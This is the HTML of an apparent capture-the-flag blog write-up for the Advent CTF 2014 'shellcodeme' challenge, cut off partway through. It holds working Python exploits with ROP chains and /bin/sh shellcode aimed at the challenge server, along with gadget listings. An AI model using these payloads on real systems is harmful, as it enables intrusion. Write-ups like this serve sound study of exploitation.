@@ -1,0 +1,661 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Advent CTF 2014 - Shellcodeme - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="Why o why do we take part in these painful exercises? Again, shellcodeme seemed like such a simple task. But looks, like all the other challenges of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Advent CTF 2014 - Shellcodeme</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-12-24T11:37:46+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:37 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>We&rsquo;re given a binary and the C source code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define SHELLCODE_LEN 1024</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">);</span> <span class="c1">// no no no~</span>
+</span><span class='line'>    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The bug was kind of obvious:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span> <span class="c1">// read to the location of buf itself</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">POP3RET</span> <span class="o">=</span> <span class="mh">0x804855d</span>
+</span><span class='line'><span class="n">MPROTECT</span> <span class="o">=</span> <span class="mh">0x8048330</span>
+</span><span class='line'><span class="n">READ</span> <span class="o">=</span> <span class="mh">0x8048340</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080484fc</span><span class="p">)</span>        <span class="c"># leave; ret (restore stack)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span>               <span class="c"># dummy </span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MPROTECT</span><span class="p">)</span>          <span class="c"># mprotect shellcode area back to rwx</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># addr of shellcode</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>           <span class="c"># size (page-aligned)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>              <span class="c"># PROT_READ|PROT_EXEC|PROT_WRITE</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">READ</span><span class="p">)</span>              <span class="c"># read in our shellcode</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>              <span class="c"># stdin</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># address</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>             <span class="c"># copied value</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># return to shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwnable.katsudon.org&#39;</span><span class="p">,</span> <span class="mi">33201</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># send first stage</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># for some reason, this delay was necessary</span>
+</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># send shellcode, spawns /bin/sh</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
+</span><span class='line'>ls -alh
+</span><span class='line'>total 36K
+</span><span class='line'>dr-xr-xr-x <span class="m">2</span> root shellcodeme2 4.0K Dec <span class="m">22</span> 22:09 .
+</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root         4.0K Dec <span class="m">22</span> 22:09 ..
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">220</span> Sep <span class="m">26</span> 04:49 .bash_logout
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2 3.4K Sep <span class="m">26</span> 04:49 .bashrc
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">675</span> Sep <span class="m">26</span> 04:49 .profile
+</span><span class='line'>-r--r----- <span class="m">1</span> root shellcodeme2   <span class="m">34</span> Dec <span class="m">22</span> 22:09 flag
+</span><span class='line'>-r-xr-sr-x <span class="m">1</span> root shellcodeme2 8.5K Dec <span class="m">22</span> 22:09 shellcodeme2
+</span><span class='line'>cat flag 2&gt;<span class="p">&amp;</span>1
+</span><span class='line'>cat: flag: Permission denied
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>
+
+<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400
+</span><span class='line'>   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
+</span><span class='line'>   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
+</span><span class='line'>   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
+</span><span class='line'>   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;<span class="nb">read</span>@plt&gt;
+</span><span class='line'>   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
+</span><span class='line'>   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
+</span><span class='line'>   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
+</span><span class='line'>   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x0040068a : pop rbx<span class="p">;</span> pop rbp<span class="p">;</span> pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret
+</span><span class='line'>0x00400671 : mov edx, ebp<span class="p">;</span> mov rsi, r14<span class="p">;</span> mov edi, r15d<span class="p">;</span> call <span class="o">[</span>r12 + rbx*8<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Prepare for some mind-bending ROP chains&hellip;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
+</span><span class='line'><span class="sd">   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># first, fix up stack   </span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400690</span><span class="p">)</span>   <span class="c"># pop pop ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#### MPROTECT</span>
+</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call mprotect</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>          <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>          <span class="c"># rbp -&gt; edx = mprotect.mask</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00601038</span><span class="o">-</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># r12 -&gt; mprotect@got.plt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># r14 -&gt; rsi -&gt; esi = mprotect.len</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r15 -&gt; rdi -&gt; edi = mprotect.addr</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#### READ</span>
+</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call read</span>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="sd">   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400</span>
+</span><span class='line'><span class="sd">   0x00000000004005f7 &lt;+58&gt;:   mov    rsi,rax</span>
+</span><span class='line'><span class="sd">   0x00000000004005fa &lt;+61&gt;:   mov    edi,0x0</span>
+</span><span class='line'><span class="sd">   0x00000000004005ff &lt;+66&gt;:   mov    eax,0x0</span>
+</span><span class='line'><span class="sd">   0x0000000000400604 &lt;+71&gt;:   call   0x400490 &lt;read@plt&gt;</span>
+</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
+</span><span class='line'><span class="c"># 0x601020 &lt;read@got.plt&gt;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>       <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># rbp -&gt; edx = 0x400</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="o">-</span><span class="mh">0x3ff</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>   <span class="c"># r12 -&gt; read@got.plt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13 </span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r14 -&gt; rsi -&gt; esi = read.addr</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r15 -&gt; rdi -&gt; edi = 0?</span>
+</span><span class='line'>                          <span class="c"># lucky for me, rax = 0</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># return to shellcode!</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'>   <span class="mh">0x400671</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">ebp</span>
+</span><span class='line'>   <span class="mh">0x400673</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">r14</span>
+</span><span class='line'>   <span class="mh">0x400676</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">r15d</span>
